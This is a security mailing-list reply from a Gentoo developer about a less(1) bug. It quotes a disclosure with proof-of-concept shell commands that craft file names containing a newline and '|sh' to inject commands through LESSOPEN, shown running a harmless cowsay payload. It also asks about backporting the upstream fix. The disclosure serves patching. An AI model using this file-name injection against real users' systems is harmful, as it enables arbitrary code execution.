Received: (qmail 18331 invoked by uid 550); 12 Apr 2024 15:45:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31890 invoked from network); 12 Apr 2024 12:42:23 -0000
From: Sam James <sam@gentoo.org>
To: oss-security@lists.openwall.com
In-Reply-To: <20240412122031.pt2sx6rasca3mgpu@jwilk.net> (Jakub Wilk's message
	of "Fri, 12 Apr 2024 14:20:31 +0200")
Organization: Gentoo
References: <20240412122031.pt2sx6rasca3mgpu@jwilk.net>
User-Agent: mu4e 1.12.3; emacs 30.0.50
Date: Fri, 12 Apr 2024 13:42:05 +0100
Message-ID: <87frvqvjky.fsf@gentoo.org>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="=-=-=";
	micalg=pgp-sha512; protocol="application/pgp-signature"
Subject: Re: [oss-security] less(1) with LESSOPEN mishandles \n in paths

--=-=-=
Content-Type: text/plain

Jakub Wilk <jwilk@jwilk.net> writes:

> less(1) does not correctly escape newlines in pathnames when
> constructing command line of the input preprocessor. If a user ran
> less(1) on files with untrusted names, this could result in execution
> of arbitrary code.
>
> The input preprocessor is enabled by the LESSOPEN environment variable.
> But if you didn't set it, don't worry, because zless(1) (or xzless(1),
> or zstdless(1)) sets it for you:
>
>    $ echo 'cowsay pwned' > './\' && touch "$(printf '\n|sh')"
>    $ zless ./*
>     _______
>    < pwned >
>     -------
>            \   ^__^
>             \  (oo)\_______
>                (__)\       )\/\
>                    ||----w |
>                    ||     ||
>    ./
>    |sh (file 1 of 2) (END) - Next: ./\
>
> On Ubuntu systems, $LESSOPEN is set in ~/.bashrc by default, so the
> bug can be exploited even without the wrapper:
>

Unfortunately, it looks like we're the same in Gentoo.

>    $ mkdir m "$(printf '\n|m')" && touch "$(printf '\n|m/oo')" && echo 'cowsay pwned' > m/oo && chmod +x m/oo
>    $ less ./*/*
>     _______
>    < pwned >
>     -------
>            \   ^__^
>             \  (oo)\_______
>                (__)\       )\/\
>                    ||----w |
>                    ||     ||
>    ./
>    |m/oo (file 1 of 2) (END) - Next: ./m/oo
>
>
> Upstream fix:
> https://github.com/gwsw/less/commit/007521ac3c95bc76

Thanks.

Any idea if upstream plan to backport it? It doesn't apply cleanly I
think to the last release 643 (653 is a beta) but I'll try do it now.

--=-=-=
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iOUEARYKAI0WIQQlpruI3Zt2TGtVQcJzhAn1IN+RkAUCZhksHl8UgAAAAAAuAChp
c3N1ZXItZnByQG5vdGF0aW9ucy5vcGVucGdwLmZpZnRoaG9yc2VtYW4ubmV0MjVB
NkJCODhERDlCNzY0QzZCNTU0MUMyNzM4NDA5RjUyMERGOTE5MA8cc2FtQGdlbnRv
by5vcmcACgkQc4QJ9SDfkZBlLgD9E/Up0KBsCb///qqZluDTTOGw546saP3JnC/Q
kyTe/OkA/0NDUknaG+GTIBXdiZhxZy9WnIBjYy157uf/8f9m/pcO
=o3er
-----END PGP SIGNATURE-----
--=-=-=--
